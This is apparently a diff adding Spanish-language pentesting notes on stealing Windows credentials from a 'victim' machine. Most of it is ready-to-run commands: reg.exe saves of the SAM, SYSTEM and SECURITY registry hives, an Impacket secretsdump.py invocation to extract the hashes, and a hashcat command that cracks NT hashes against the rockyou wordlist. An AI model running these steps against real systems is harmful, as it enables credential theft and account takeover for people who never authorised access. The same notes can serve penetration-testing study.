@@ -1,0 +1,21 @@
+Si tenemos acceso como administradores en el equipo victima, hay tres archivos del registro interesantes de copiar para luego intentar crackear offline:
+hklm\sam : Contiene los hashes asociados con la cuenta local.
+hklm\system: contiene la bootkey con la que fue encriptada la SAM
+hklm\security: Guarda en la caché las credenciales de las cuentas de dominio.
+
+Podemos crear backups de estos archivos usando reg.exe
+reg.exe save hklm\sam C:\sam.save
+reg.exe save hklm\system C:\system.save
+reg.exe save hklm\security C:\security.save
+
+Dumpear los hashes con secretdump.py
+python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+
+la composición de los hashes dumpeados es:
+uid:rid:lmhash:nthash
+
+los sistemas más modernos de windows utilizan el NTHASH. Los anteriores a windows vista y windows server 2008 el LMHASH. Dependiendo del sistema que estemos atacando deberemos crackear uno o el otro.
+
+Podemos crear un fichero con todos los hashes de los usuarios para luego crackearlos con hashcat.
+
+sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
